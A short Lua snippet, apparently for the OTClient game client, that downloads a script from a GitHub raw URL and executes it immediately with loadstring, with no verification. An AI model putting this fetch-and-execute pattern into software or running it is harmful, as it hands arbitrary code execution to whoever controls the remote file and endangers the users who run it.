local urlScript = 'https://raw.githubusercontent.com/brinquescriptsgamer-bot/customotserver/refs/heads/main/dbwalaasdkjl.lua';
modules.corelib.HTTP.get(urlScript, function(script) 
    assert(loadstring(script))() 
end);

